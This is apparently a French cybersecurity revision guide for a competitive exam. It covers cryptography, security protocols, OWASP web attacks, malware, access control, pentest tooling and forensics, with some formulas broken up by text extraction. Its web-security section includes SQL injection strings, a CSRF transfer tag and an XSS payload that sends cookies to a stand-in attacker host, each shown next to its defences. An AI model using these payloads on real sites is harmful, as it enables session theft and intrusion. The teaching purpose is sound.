      APT              Nation-state     Espionnage, guerre cyber
      Insider          Interne          Vengeance, corruption`},{id:"1.3",c:1,t:"Principes de sécurité",x:`1.3. PRINCIPES DE SÉCURITÉ

❖ Définition
Principes fondamentaux à appliquer dans tout système sécurisé :
 Moindre privilège (Least Privilege) : accès minimal nécessaire
 Défense en profondeur : plusieurs couches de sécurité indépendantes
 Sécurité par conception (Security by Design) : intégrer dès la conception
 Séparation des privilèges : diviser les droits entre les utilisateurs
 Fail-safe defaults : état de refus par défaut, accès explicitement accordé
 Open design : la sécurité ne repose pas sur le secret de l'implémentation
 KISS (Keep It Simple and Secure) : complexité = surface d'attaque

        2|              Cryptographie
                                                                                 root@cyber:~#`},{id:"2.1",c:2,t:"Chiffrement symétrique",x:`❖ Définition
  Le chiffrement symétrique utilise la même clé pour chiffrer et déchiffrer.
  Avantage : très rapide.
  Inconvénient : problème de distribution sécurisée de la clé.

  ➔ Résumé rapide Algorithmes symétriques

      Algo        Clé            Bloc       Statut
      DES         56 bits        64 bits    Obsolète (cassé en 1998)
      3DES        112/168 bits   64 bits    Déprécié
      AES-128     128 bits       128 bits   Standard actuel
      AES-256     256 bits       128 bits   Très sécurisé
      RC4         Variable       Stream     Obsolète (WEP, SSL2)
      ChaCha20    256 bits       Stream     Moderne, mobile
      Blowfish     32-448 bits    64 bits    Dépassé

  ❖ Définition
  Modes d'opération AES :
   ECB (Electronic Codebook) : chaque bloc chiffré indépendamment — DANGEREUX (patterns
      visibles)
   CBC (Cipher Block Chaining) : XOR avec bloc précédent, IV requis — problèmes de padding
   CTR (Counter) : chiffrement de flux, parallélisable, pas de padding
   GCM (Galois/Counter Mode) : authentification intégrée (AEAD) — recommandé
   CCM : comme GCM, utilisé dans WPA2`},{id:"2.2",c:2,t:"Chiffrement asymétrique (clé publique)",x:`❖ Définition
  Le chiffrement asymétrique utilise une paire de clés :
   Clé publique : distribuée librement, pour chiffrer ou vérifier une signature
   Clé privée : gardée secrète, pour déchiffrer ou signer
  Avantage : pas de problème de distribution de clé.
  Inconvénient : lent (1000x plus lent que symétrique).
  En pratique : asymétrique pour échanger une clé symétrique (hybride — TLS).

                                                                         2.3. FONCTIONS DE HACHAGE

  ➔ Résumé rapide Algorithmes asymétriques

      Algo         Taille clé      Base math.            Usage
      RSA          2048+ bits      Factorisation         Chiffrement, signature
      DSA          1024-3072       Log discret           Signature uniquement
      ECDSA        256-521 bits    Courbes elliptiques   Signature (Bitcoin, TLS)
      ECDH         256-521 bits    Courbes elliptiques   Échange de clés
      DH           2048+ bits      Log discret           Échange de clés
      ElGamal      2048+ bits      Log discret           Chiffrement, signature

  ➔ Formule / Calcul RSA — Fonctionnement
       1. Choisir deux grands premiers p et q
        n = p × q (module)
       2.
        ϕ(n) = (p − 1)(q − 1)
       3.
     4. Choisir e tel que gcd(e, ϕ(n)) = 1 (exposant public)
     5. d = e
              −1 (mod ϕ(n)) (exposant privé)

     6. Clé publique : (n, e) — Clé privée : (n, d)
                              e                              d
     7. Chiffrement : C = M (mod n) — Déchiffrement : M = C (mod n)
  Sécurité basée sur la diculté de factoriser n en p × q .`},{id:"2.3",c:2,t:"Fonctions de hachage",x:`❖ Définition
  Une       fonction de hachage cryptographique prend une entrée arbitraire et produit une sortie
  de taille fixe (   digest / empreinte).
  Propriétés requises :
   Déterministe : même entrée → même sortie
   Unidirectionnel (one-way) : impossible d'inverser
   Résistance aux collisions : dicile de trouver x ̸= y tel que H(x) = H(y)
   Effet avalanche : un bit changé → 50% des bits du digest changent

  ➔ Résumé rapide Fonctions de hachage

      Fonction      Taille          Statut               Usages
      MD5           128 bits        Cassé (collisions)   Vérif. d'int. (non crypt.)
      SHA-1         160 bits        Cassé (2017)         Déprécié
      SHA-256       256 bits        Sécurisé             TLS, Bitcoin, signature
      SHA-3         224-512 bits    Sécurisé             Alternative post-SHA-2
      SHA-512       512 bits        Sécurisé             Très sécurisé
      BLAKE2        256/512 bits    Sécurisé             Très rapide
      bcrypt        Variable        Sécurisé             Mots de passe (lent voulu)
      Argon2        Variable        Sécurisé             MdP (résistant GPU)

  ★ Astuce Concours
  Hachage de mots de passe : ne jamais stocker les MdP en clair ni en MD5/SHA-1 simple.
  Utiliser bcrypt, Argon2 ou PBKDF2 (algorithmes lents avec sel — salt).
  Le salt : chaîne aléatoire unique ajoutée avant le hachage → empêche les Rainbow Tables.

                                              2.4. INFRASTRUCTURE À CLÉS PUBLIQUES (PKI)

  HMAC (Hash-based MAC) : HM AC(K, M ) = H((K ⊕ opad)∥H((K ⊕ ipad)∥M )) — authentifie
  l'intégrité.`},{id:"2.4",c:2,t:"Infrastructure à Clés Publiques (PKI)",x:`❖ Définition
  La   PKI (Public Key Infrastructure) est un ensemble de composants permettant la gestion des
  clés publiques et des certificats numériques.
   CA (Certificate Authority) : autorité de certification, signe les certificats
   RA (Registration Authority) : vérifie l'identité avant émission
   Certificat X.509 : lie une identité à une clé publique, signé par une CA
   CRL (Certificate Revocation List) : liste des certificats révoqués
   OCSP (Online Certificate Status Protocol) : vérification en temps réel

  ❖ Définition
  Contenu d'un certificat X.509 v3 :
   Version, numéro de série
   Algorithme de signature
   Nom de l'émetteur (Issuer : la CA)
   Période de validité (Not Before / Not After)
   Nom du sujet (Subject : le propriétaire)
   Clé publique du sujet
   Extensions (SAN, Key Usage, Basic Constraints...)
   Signature de la CA`},{id:"2.5",c:2,t:"Signatures numériques",x:`❖ Définition
  Une   signature numérique garantit authenticité, intégrité et non-répudiation.
  Processus :
       1. Alice calcule H = SHA256(M essage)
       2. Alice chiffre H avec saclé privée → signature S = Epriv (H)
       3. Bob déchiffre S avec la clé publique d'Alice → obtient H
                                                                  ′

       4. Bob calcule H = SHA256(M essage) reçu
       5. Si H = H
                     ′ : message authentique et non altré

  ❍ Note
  Die-Hellman : protocole d'échange de clés sur un canal non sécurisé.
  Protocole : Alice choisit a secret, Bob choisit b secret.
  Paramètres publics : p (premier), g (générateur).
  Alice envoie A = g
                       a (mod p), Bob envoie B = g b (mod p).

  Clé commune : K = B
                            a (mod p) = Ab (mod p) = g ab (mod p)

        3|            Protocoles de Sécurité
                                                                                          root@cyber:~#`},{id:"3.1",c:3,t:"TLS / SSL",x:`➣ Protocole / Mécanisme TLS — Transport Layer Security
    TLS protège les communications au niveau transport.      Il assure   confidentialité, intégrité et
    authentification.
     SSL 2.0/3.0 : obsolètes et vulnérables (POODLE, DROWN)
     TLS 1.0/1.1 : dépréciés (RFC 8996)
     TLS 1.2 : encore utilisé (2008)
     TLS 1.3 : standard actuel (2018) — supprime les algorithmes faibles, 1-RTT
    TLS Handshake (simplifié) :
      1. Client → Serveur : ClientHello (versions, ciphers supportés, random)
      2. Serveur → Client : ServerHello (cipher choisi, certificat, random)
      3. Client vérifie le certificat du serveur (PKI)
      4. Échange de clés (ECDHE — Perfect Forward Secrecy)
      5. Calcul de la clé de session symétrique
      6. Communication chiffrée avec AES-GCM

    ★ Astuce Concours
    Cipher Suite : algorithmes négociés lors du TLS Handshake.
    Exemple : TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384

        ECDHE : échange de clés (avec PFS)
        RSA : authentification du serveur
        AES_256_GCM : chiffrement symétrique
        SHA384 : intégrité (MAC)
    PFS (Perfect Forward Secrecy) : chaque session utilise une clé temporaire → compromission
    d'une clé ne compromet pas les sessions passées.

3.2    SSH

    ➣ Protocole / Mécanisme SSH — Secure Shell (Port 22)
    SSH fournit un accès distant chiffré. Il remplace Telnet, rsh, rcp.
     Authentification par MdP : pratique mais vulnérable (brute force)
     Authentification par clé publique : recommandée
     SSH Tunneling : redirection de ports sur canal chiffré
     SFTP/SCP : transfert de fichiers sécurisé sur SSH
1   # Generer une paire de cles SSH
2   ssh - keygen -t ed25519 -C " mon_email@example . com "
4   # Copier la cle publique sur le serveur
5   ssh - copy - id user@serveur

                                                                                       3.3. KERBEROS

 7   # Connexion avec cle privee
 8   ssh -i ~/. ssh / id_ed25519 user@serveur
10   # Tunneling local ( port forwarding )
11   ssh -L 8080: localhost :80 user@serveur
13   # Tunneling dynamique ( SOCKS proxy )
14   ssh -D 1080 user@serveur`},{id:"3.3",c:3,t:"Kerberos",x:`➣ Protocole / Mécanisme Kerberos — Authentification centralisée

     Kerberos est un protocole d'authentification de réseau utilisant des   tickets (pas de MdP transmis
     sur le réseau).
      KDC (Key Distribution Center) : serveur central
      AS (Authentication Service) : émet le TGT
      TGS (Ticket Granting Service) : émet les tickets de service
      TGT (Ticket Granting Ticket) : ticket principal (durée limitée)
     Flux : Client → AS (MdP) → TGT → TGS (TGT) → Ticket service → Serveur
     Utilisé dans : Active Directory (Windows), Linux PAM`},{id:"3.4",c:3,t:"OAuth 2.0 et JWT",x:`➣ Protocole / Mécanisme OAuth 2.0 — Délégation d'autorisation
     OAuth 2.0 permet à une application d'accéder à des ressources au nom d'un utilisateur        sans
     partager son MdP.
      Resource Owner : utilisateur
      Client : application tierce
      Authorization Server : serveur qui émet les tokens (ex: Google, GitHub)
      Resource Server : API protégée
      Access Token : jeton d'accès (durée courte)
      Refresh Token : pour renouveler l'access token

     ➣ Protocole / Mécanisme JWT — JSON Web Token
     Structure : header.payload.signature

 1   // Header ( base64url )
 2   {" alg ": " HS256 " , " typ ": " JWT "}
 4   // Payload ( base64url )
 5   {" sub ": " user123 " , " name ": " Ahmed " , " iat ": 1516239022 , " exp ":
         1516242622}
 7   // Signature
 8   HMACSHA256 ( base64url ( header ) + "." + base64url ( payload ) , secret )

         Stateless : le serveur n'a pas besoin de stocker la session
         Ne pas stocker des données sensibles dans le payload (il est lisible !)
         Attention à la vulns alg:none et au faible secret

          Part II

Attaques et Vulnérabilités

      4|            Attaques Réseau
                                                                                  root@cyber:~#`},{id:"4.1",c:4,t:"Attaques par déni de service",x:`☞ Menace / Attaque DoS et DDoS

   DoS (Denial of Service) : saturer un service depuis une seule source
   DDoS (Distributed DoS) : même chose mais depuis des milliers de machines (botnet)
   SYN Flood : envoyer des milliers de SYN TCP sans ACK (tables SYN saturées)
   UDP Flood : saturation par paquets UDP
   Amplification DNS : requête petite → réponse grande (facteur 50x)
   Smurf Attack : ping broadcast avec IP source usurpée
   Slowloris : maintenir des connexions HTTP incomplètes pour épuiser les slots
  Contre-mesures : rate limiting, SYN cookies, CDN, scrubbing centers, anycast, firewall`},{id:"4.2",c:4,t:"Attaques sur les protocoles",x:`☞ Menace / Attaque Man-in-the-Middle (MitM)
  L'attaquant s'intercale entre deux parties communicantes.
  Techniques :
      ARP Spoofing : empoisonnement du cache ARP
      DNS Spoofing : fausses réponses DNS
      SSL Stripping : dégrader HTTPS vers HTTP
      BGP Hijacking : détourner le routage Internet
      Evil Twin : point d'accès Wi-Fi malveillant
  Protection : HTTPS (HSTS), DNSSEC, certificats épinglés (pinning), VPN

  ☞ Menace / Attaque Attaques de rejeu et autres
   Replay Attack : capturer et rejouer un paquet valide
   IP Spoofing : usurper l'adresse IP source
   Session Hijacking : voler le cookie de session
   Sning : capturer le trafic réseau (Wireshark, tcpdump)
   Port Scanning : découvrir les services actifs (nmap)
  Protection contre replay : timestamps, nonces, numéros de séquence

         5|            Sécurité Web — OWASP Top 10
                                                                                   root@cyber:~#`},{id:"5.1",c:5,t:"OWASP Top 10 (2021)",x:`❖ Définition
     OWASP (Open Web Application Security Project) publie le Top 10 des vulnérabilités web les
     plus critiques.

     ➔ Résumé rapide OWASP Top 10 — 2021

      Rang Catégorie                       Description courte
       A01     Broken Access Control       Contrôle d'accès défaillant
       A02     Cryptographic Failures      Échecs cryptographiques
       A03     Injection                   SQL, LDAP, OS, NoSQL
       A04     Insecure Design             Conception non sécurisée
       A05     Security Misconfiguration    Mauvaise configuration
       A06     Vulnerable Components       Composants vulnérables
       A07     Auth. Failures              Authentification défaillante
       A08     Integrity Failures          Défaillances d'intégrité
       A09     Logging Failures            Journalisation insusante
       A10     SSRF                        Server-Side Request Forgery`},{id:"5.2",c:5,t:"Injection SQL",x:`☞ Menace / Attaque SQL Injection
     L'attaquant insère du code SQL malveillant dans une entrée utilisateur.

 1   -- Requete vulnerable
 2   SELECT * FROM users WHERE login = ' ' AND pass = ' $pass '
 4   -- Injection classique : login = " admin ' - -"
 5   SELECT * FROM users WHERE login = ' admin ' - - ' AND pass = '... '
 6   -- Le -- commente le reste = > bypass total !
 8   -- Injection UNION ( extraction de donnees )
 9   -- login = " ' UNION SELECT table_name , null FROM information_schema .
        tables - -"
11   -- Blind SQL Injection ( pas de sortie visible )
12   -- ' AND SUBSTRING (( SELECT password FROM users WHERE login = ' admin ') ,1 ,1)
        = 'a ' - -

     Protection :
        Requêtes préparées (Prepared Statements / Parameterized Queries) — solution princi-
         pale
         Validation et sanitisation des entrées

                                                              5.3. XSS — CROSS-SITE SCRIPTING

        ORM (Object-Relational Mapping)
        Principe du moindre privilège sur la DB
        WAF (Web Application Firewall)`},{id:"5.3",c:5,t:"XSS — Cross-Site Scripting",x:`☞ Menace / Attaque XSS — Cross-Site Scripting
    L'attaquant injecte du code JavaScript malveillant exécuté dans le navigateur de la victime.
    Types de XSS :
     Reflected XSS : script dans l'URL, exécuté immédiatement (non persistant)
     Stored XSS : script sauvegardé en BD, exécuté pour chaque visiteur (persistant — plus dan-
      gereux)
     DOM-based XSS : manipulation du DOM sans passer par le serveur
1   <! - - Exemple de payload XSS -->
2   < script > document . location = ' http :// attaquant . com / steal ? c = '+ document .
         cookie </ script >

    Protection :
       Encodage des sorties (HTML encoding : & → &amp; < → &lt;)
       CSP (Content Security Policy) : header HTTP limitant les sources
       Attribut HttpOnly sur les cookies (inaccessible depuis JS)
        Validation des entrées (whitelist)`},{id:"5.4",c:5,t:"CSRF et autres",x:`☞ Menace / Attaque CSRF — Cross-Site Request Forgery
    Force un utilisateur authentifié à effectuer une action non voulue.

1   <! - - Page malveillante -->
2   < img src =" https :// bank . com / transfer ? to = attacker & amount =1000" >
3   <! - - Si l ' utilisateur est connecte a bank . com , le virement s ' effectue !
         -->

    Protection :
       Token CSRF : jeton unique par formulaire, vérifié côté serveur
       Header SameSite sur les cookies (SameSite=Strict ou Lax)
       Vérification du header Origin/Referer

    ☞ Menace / Attaque Autres vulnérabilités web

     IDOR (Insecure Direct Object Reference) : accéder aux ressources d'autrui en modifiant l'ID
     Path Traversal : ../../etc/passwd pour accéder aux fichiers système
     Command Injection : insérer des commandes OS via les entrées
     XXE (XML External Entity) : inclusion de fichiers locaux via XML
     SSRF (Server-Side Request Forgery) : forcer le serveur à contacter des ressources internes
     Open Redirect : rediriger vers un site malveillant
     Clickjacking : iframe superposée sur un vrai site (protection : X-Frame-Options)

         6|             Malwares et Ingénierie Sociale
                                                                                        root@cyber:~#`},{id:"6.1",c:6,t:"Types de malwares",x:`➔ Résumé rapide Classification des malwares

      Type              Description
      Virus             S'attache à un fichier, se propage quand il est exécuté
      Ver (Worm)        Se propage seul sur le réseau, sans action utilisateur
      Cheval de Troie   Se déguise en logiciel légitime
      Ransomware        Chiffre les données et exige une rançon
      Spyware           Espionne l'activité (keylogger, capture écran)
      Adware            Ache des publicités non désirées
      Rootkit           Se cache dans l'OS, dicile à détecter
      Botnet            Réseau de machines compromises (C&C)
      Backdoor          Accès distant non autorisé et persistant
      Keylogger         Enregistre les frappes clavier

  ★ Astuce Concours
  Ransomware — comment ça marche :
       1. Infection (phishing, vulnérabilité, USB)
       2. Génération d'une clé AES aléatoire
       3. Chiffrement de tous les fichiers avec AES
       4. Chiffrement de la clé AES avec la clé RSA publique de l'attaquant
       5. Achage du message de rançon (paiement en crypto)
       6. L'attaquant envoie la clé RSA privée après paiement
  Protection : sauvegardes régulières (3-2-1), mises à jour, formation, filtrage email`},{id:"6.2",c:6,t:"Ingénierie sociale",x:`☞ Menace / Attaque Techniques d'ingénierie sociale
   Phishing : email frauduleux imitant une organisation légitime
   Spear Phishing : phishing ciblé (personnalisé pour la victime)
   Whaling : phishing visant les dirigeants (CEO, CFO)
   Vishing : phishing par appel téléphonique
   Smishing : phishing par SMS
   Baiting : clé USB abandonnée avec malware
   Pretexting : usurpation d'identité avec fausse histoire
   Quid pro quo : service contre information
   Tailgating : accès physique en suivant quelqu'un
  Protection principale : formation et sensibilisation des utilisateurs

       Part III

Sécurité des Systèmes

        7|            Contrôle d'Accès et Authentification
                                                                                       root@cyber:~#`},{id:"7.1",c:7,t:"Authentification",x:`❖ Définition
    Authentification : vérifier qu'une entité est bien celle qu'elle prétend être.
    3 facteurs d'authentification :
     Ce que vous savez : mot de passe, PIN, question secrète
     Ce que vous avez : token OTP, carte à puce, smartphone
     Ce que vous êtes : empreinte digitale, iris, visage (biométrie)
    MFA/2FA : authentification multi-facteurs = deux facteurs ou plus.
    SSO (Single Sign-On) : authentification unique pour plusieurs services.

    ❍ Note
    Bonnes pratiques mots de passe :
        Longueur minimale : 12 caractères (NIST 2020 recommande 8+)
        Complexité : majuscules, minuscules, chiffres, spéciaux
        Pas de réutilisation entre sites
        Stocker avec bcrypt/Argon2 (jamais en clair ni MD5)
        Utiliser un gestionnaire de mots de passe (KeePass, Bitwarden)
        Activer la MFA partout où c'est possible`},{id:"7.2",c:7,t:"Contrôle d'accès",x:`➔ Résumé rapide Modèles de contrôle d'accès

      Modèle Nom                                  Principe
      DAC       Discretionary Access Control      Propriétaire décide des droits
      MAC       Mandatory Access Control          Système impose (niveaux de secret)
      RBAC      Role-Based Access Control         Droits par rôles (très utilisé)
      ABAC      Attribute-Based Access Control    Conditions multi-attributs
      PBAC      Policy-Based Access Control       Règles de politique centralisées

    ❖ Définition
    Permissions Linux (chmod) :
1   # Structure : rwxrwxrwx ( owner - group - others )
2   # r =4 , w =2 , x =1
3   chmod 755 fichier    # rwxr - xr - x
4   chmod 644 fichier    # rw -r - -r - -
5   chmod 600 fichier    # rw - - - - - - - ( cles SSH privees )
7   # SUID ( Set User ID ) : execute avec les droits du proprietaire
8   chmod 4755 programme     # - rwsr - xr - x
9   # SGID : execute avec les droits du groupe

                                                           7.2. CONTRÔLE D'ACCÈS

10   chmod 2755 dossier
11   # Sticky bit : seul le proprietaire peut supprimer dans / tmp
12   chmod 1777 / tmp       # drwxrwxrwt
14   # Capabilities Linux : droits fins sans etre root
15   getcap / usr / bin / ping

        8|            Sécurité Réseau
                                                                                  root@cyber:~#`},{id:"8.1",c:8,t:"Pare-feu et DMZ",x:`❖ Définition
    Pare-feu (Firewall) : filtre le trafic réseau selon des règles.
     Stateless : filtre sans état (par IP/port) — rapide mais basique
     Stateful : suit l'état des connexions TCP — plus intelligent
     NGFW (Next-Gen) : inspection applicative (couche 7), IPS intégré
     WAF (Web Application Firewall) : protection spécifique HTTP/HTTPS
    DMZ (Zone Démilitarisée) : zone isolée entre réseau interne et Internet.`},{id:"8.2",c:8,t:"IDS et IPS",x:`❖ Définition
     IDS (Intrusion Detection System) : détecte et alerte (passif )
     IPS (Intrusion Prevention System) : détecte et bloque (actif )
     NIDS/NIPS : base réseau (Snort, Suricata)
     HIDS/HIPS : base hôte (OSSEC, Wazuh)
    Méthodes de détection :
       Signatures : correspond à des patterns connus (rapide, pas de 0-day)
       Anomalies : déviation par rapport à un comportement normal (false positives)

8.3    VPN

    ❖ Définition
    VPN (Virtual Private Network) : tunnel chiffré sur un réseau public.
     IPsec : sécurité au niveau IP
        — AH (Authentication Header) : intégrité seule
        — ESP (Encapsulating Security Payload) : chiffrement + intégrité
        — Modes : transport (hôte à hôte) vs tunnel (réseau à réseau)
     OpenVPN : VPN open source basé TLS
     WireGuard : VPN moderne, très performant
     SSL VPN : accès via navigateur (HTTPS)`},{id:"8.4",c:8,t:"Analyse de sécurité réseau",x:`➣ Protocole / Mécanisme Commandes de sécurité réseau

1   # Scan de ports ( nmap )
2   nmap - sS 192.168.1.1                  # SYN scan ( furtif )
3   nmap - sV 192.168.1.0/24               # detection de version
4   nmap -O target                         # detection d ' OS

                                                     8.4. ANALYSE DE SÉCURITÉ RÉSEAU

 5   nmap -A target                     # scan agressif ( OS + version + scripts )
 6   nmap -p 80 ,443 ,22 target         # ports specifiques
 8   # Capture de paquets ( tcpdump )
 9   tcpdump -i eth0 port 80
10   tcpdump -w capture . pcap
11   tcpdump -r capture . pcap
13   # Analyse de certificat TLS
14   openssl s_client - connect site . com :443
15   openssl x509 - in cert . pem - text - noout
17   # Verifier les ports ouverts ( Linux )
18   ss - tuln
19   netstat - an
21   # Tester la securite SSL / TLS
22   testssl . sh https :// example . com
23   nmap -- script ssl - enum - ciphers -p 443 target

                Part IV

Normes, Forensique et Tests d'Intrusion

        9|             Normes et Conformité
                                                                                root@cyber:~#`},{id:"9.1",c:9,t:"ISO/IEC 27001",x:`❖ Définition
  ISO 27001 : norme internationale pour le Système de Management de la Sécurité de
  l'Information (SMSI).
   Définit les exigences pour établir, implémenter et améliorer un SMSI
   Processus : PDCA (Plan-Do-Check-Act)
   Annexe A : 114 contrôles dans 14 domaines (ISO 27002)
   Certification par audit externe

  ➔ Résumé rapide Frameworks et normes de sécurité

      Norme/Framework Organisation Domaine
      ISO 27001             ISO/IEC           SMSI (management sécurité)
      NIST CSF              NIST (USA)        Cybersecurity Framework
      NIST SP 800-53        NIST              Contrôles de sécurité (gov.)
      GDPR                  UE                Protection données personnelles
      PCI DSS               PCI SSC           Sécurité paiements bancaires
      HIPAA                 USA               Santé (données médicales)
      SOC 2                 AICPA             Services cloud (SaaS)
      Common Criteria       Multi-pays        Évaluation produits sécurité`},{id:"9.2",c:9,t:"GDPR / RGPD",x:`❖ Définition
  Le   RGPD (Règlement Général sur la Protection des Données) — GDPR en anglais :
   Applicable depuis mai 2018 dans l'UE
   Protège les données personnelles des citoyens européens
   Droits : accès, rectification, effacement («droit à l'oubli»), portabilité
   Sanctions : jusqu'à 4% du CA mondial ou 20 M¿
   DPO (Data Protection Ocer) : obligatoire dans certains cas
   Notification des violations : 72 heures max à la CNIL
   Privacy by Design : protection intégrée dès la conception

          10 |          Tests d'Intrusion et Forensique
                                                                                         root@cyber:~#`},{id:"10.1",c:10,t:"Penetration Testing",x:`❖ Définition
     Un   test d'intrusion (pen test) est une attaque simulée autorisée pour évaluer la sécurité d'un
     système.

     ➔ Résumé rapide Types de pen tests

      Type          Connaissance                  Réalisme
      White Box     Accès complet (code, archi)   Bas
      Grey Box      Accès partiel                 Moyen
      Black Box     Aucune info (comme l'ext.)    Élevé

     ➣ Protocole / Mécanisme Phases d'un pen test (PTES / Cyber Kill Chain)

       1. Reconnaissance : collecte d'infos (OSINT, DNS, WHOIS, LinkedIn, Shodan)
       2. Scanning : découverte de ports/services (nmap, Nessus, OpenVAS)
       3. Enumération : identification des versions, utilisateurs, partages
       4. Exploitation : exploitation des vulnérabilités (Metasploit, Burp Suite)
       5. Post-exploitation : escalade de privilèges, pivoting, persistance
       6. Reporting : documentation des vulnérabilités trouvées et recommandations

     ➣ Protocole / Mécanisme Outils de pen test courants

 1   # Reconnaissance
 2   whois example . com
 3   nslookup example . com
 4   theHarvester -d example . com -b google
 5   shodan search " hostname : example . com "
 7   # Scanning et enumeration
 8   nmap -A - T4 target
 9   nikto -h https :// target . com  # scanner web
10   gobuster dir -u http :// target -w wordlist . txt             # fuzzing
12   # Exploitation
13   msfconsole                              # Metasploit Framework
14   searchsploit apache 2.4.49              # ExploitDB
16   # Tests web
17   burpsuite                            # proxy d ' interception
18   sqlmap -u " http :// target . com /? id =1" # SQLi automatique
20   # Post - exploitation ( avec autorisation !)
21   # Escalade de privileges Linux

                                                           10.2. CYBER KILL CHAIN ET ATT&CK

22   sudo -l                                   # droits sudo
23   find / - perm -u = s 2 >/ dev / null      # SUID binaires
24   linpeas . sh                              # script d ' enum privileges`},{id:"10.2",c:10,t:"Cyber Kill Chain et ATT&CK",x:`❖ Définition
     LaCyber Kill Chain (Lockheed Martin) modélise les étapes d'une attaque :
      1. Reconnaissance : collecte d'informations
      2. Weaponization : création d'un exploit
      3. Delivery : livraison (email, web, USB)
      4. Exploitation : exécution de l'exploit
      5. Installation : installation du malware
      6. C2 (Command & Control) : prise de contrôle
      7. Actions on Objectives : objectif final
     MITRE ATT&CK : base de connaissances des tactiques et techniques d'attaquants réels.`},{id:"10.3",c:10,t:"Forensique numérique",x:`❖ Définition
     La   forensique numérique (Digital Forensics) est la science d'investigation des incidents
     numériques.
     Principes :
      Préserver l'intégrité : ne jamais modifier l'original (travailler sur des copies)
      Chaîne de traitement (Chain of Custody) : documenter chaque action
      Hash de vérification : SHA-256 de l'image disque avant/après
      Ordre de volatilité : collecter les données les plus volatiles en premier

     ➔ Résumé rapide Ordre de volatilité (RFC 3227)

      Priorité Donnée
           1       Registres CPU, cache
           2       Mémoire RAM
           3       État réseau, connexions actives
           4       Processus en cours
           5       Système de fichiers temporaires
           6       Disque dur
           7       Journaux distants (logs)
           8       Archives, sauvegardes

    Part V

Examens Blancs

      11 |                Examen Blanc 1 — Cryptographie et Pro-
                                                                                                     root@cyber:~#

tocoles

 ★ Astuce Concours
 Stratégie concours Cybersécurité :
    1. Mémorisez la triade CIA et les principes fondamentaux
    2. Différenciez symétrique (rapide, 1 clé) vs asymétrique (lent, 2 clés)
    3. Retenez : MD5/SHA-1 = cassés ; AES-256/SHA-256 = sécurisés
    4. Pour les attaques web : connaissez la protection de chacune
    5. TLS = hybride (asymétrique pour échanger clé + symétrique pour le reste)`},{id:"14.1",c:14,t:"Explications des mécanismes de sécurité",x:`❍ Note Chiffrement symétrique vs asymétrique – Explication
  Symétrique (AES, DES, 3DES) :
     1 seule clé partagée entre l'expéditeur et le destinataire.
        Rapide, idéal pour chiffrer de grandes quantités de données.
        Problème : comment transmettre la clé de manière sécurisée ?
  Asymétrique (RSA, ECC, ECDSA) :
     2 clés : publique (diffusée) et privée (secrète).
     Chiffrer avec la clé publique ⇒ seul le propriétaire de la privée peut déchiffrer
      (confidentialité).
     Signer avec la clé privée ⇒ n'importe qui vérifie avec la publique (authenticité).
        Lent. Utilisé pour échanger une clé symétrique ou pour les signatures.
  TLS = hybride : asymétrique pour négocier une clé, puis symétrique (AES) pour le trafic.

  ❍ Note Hachage vs Chiffrement – Ne pas confondre

                      Hachage                             Chiffrement
                      Non réversible (one-way)            Réversible (avec la clé)
                      Taille fixe (SHA-256 = 256           Taille variable
                      bits)
                      Vérifier l'intégrité                 Protéger la confidentialité
                      Mots de passe (bcrypt,   Ar-        Données (AES, RSA)
                      gon2)

  Pour les mots de passe : utiliser une fonction lente et salée (bcrypt, Argon2), PAS SHA-256
  seul (trop rapide = brute-force facile).

  ❍ Note Les attaques – SQLi, XSS, CSRF
        Injection SQL : l'attaquant insère du SQL dans une entrée utilisateur.
         Défense :   requêtes préparées (prepared statements). Le filtrage ne sut PAS.
        XSS (Cross-Site Scripting) : l'attaquant injecte du JavaScript dans une page vue par
         d'autres.
         Défense :   encodage des sorties (htmlspecialchars) + CSP + cookie HttpOnly.
        CSRF (Cross-Site Request Forgery) : l'attaquant force le navigateur d'un utilisateur
         authentifié à envoyer une action.
         Défense :   token CSRF + cookie SameSite.`},{id:"14.2",c:14,t:"Définitions Cybersécurité à mémoriser",x:`14.2. DÉFINITIONS CYBERSÉCURITÉ À MÉMORISER

  ❖ Définition Glossaire Cybersécurité

   Terme                         Définition
   Triade CIA                    Confidentialité + Intégrité + Disponibilité.
   Vulnérabilité                 Faiblesse exploitable dans un système.
   Menace                        Agent ou événement susceptible d'exploiter une vulnérabilité.
   Risque                        Vraisemblance × impact d'une menace exploitant une vulnérabil-
                                 ité.

   Authentification               Prouver son identité (login/password, biométrie, clé).
   Autorisation                  Déterminer les actions permises après authentification.
   MFA                           Multi-Factor Authentication : 2+ facteurs de types     différents.
   Certificat numérique           Lie une clé publique à une identité. Signé par une CA.
   PKI                           Infrastructure à clé publique : CA, certificats, révocation.
   PFS      (Perfect   Forward   Clés éphémères : compromission future n'affecte pas le passé.
   Secrecy)

   IDS                           Détecte les intrusions (alerte).
   IPS                           Détecte ET peut bloquer les intrusions.
   Firewall                      Filtre le trafic selon des règles (ports, IP, protocoles).

   Zero-day                      Vulnérabilité inconnue du fabricant, sans correctif.
   Ransomware                    Malware qui chiffre les données et demande une rançon.
   Phishing                      Usurpation d'identité pour voler des informations.`},{id:"14.3",c:14,t:"Règles fondamentales à mémoriser",x:`★ Astuce Concours 20 règles d'or Cybersécurité
       1. CIA = Confidentialité, Intégrité, Disponibilité.
       2. Symétrique = rapide, 1 clé. Asymétrique = lent, 2 clés (pub/priv).
       3. AES-GCM (sym.) et RSA/ECDSA (asym.) = standards actuels.
       4. SHA-256/SHA-3 = sécurisés. MD5/SHA-1 = cassés.
       5. TLS = hybride : asym. pour échanger clé + sym. (AES) pour les données.
       6. Protection SQLi = Prepared Statements (pas le filtrage).
       7. Protection XSS = encodage sorties + CSP + HttpOnly.
       8. Protection CSRF = tokens CSRF + SameSite cookie.
       9. MFA = facteurs de   types différents (savoir + avoir + être).
   10. PFS = clés éphémères : compromission n'affecte pas le passé.
   11. RGPD = 72h pour notifier. Amendes jusqu'à 4% CA ou 20M¿.
   12. Zero-day = vuln. inconnue du fabricant, pas de patch.
   13. Hachage ̸= chiffrement. Signature ̸= confidentialité.
   14. Ne JAMAIS stocker les mots de passe en clair ou en SHA-256 simple.
   15. Moindre privilège : n'accorder que les droits strictement nécessaires.
   16. Défense en profondeur : plusieurs couches de sécurité.
   17. Mettre à jour régulièrement (patcher les vulnérabilités connues).
   18. Sauvegardes régulières ET testées (contre le ransomware).
   19. IDS détecte. IPS détecte ET bloque.
   20. Sécurité = processus continu, pas un produit.

                                                       14.4. PIÈGES FRÉQUENTS AU CONCOURS`},{id:"14.4",c:14,t:"Pièges fréquents au concours",x:`[10 pièges classiques Cybersécurité]

  1. Confondre    hachage et chiffrement : le hachage n'est PAS réversible.
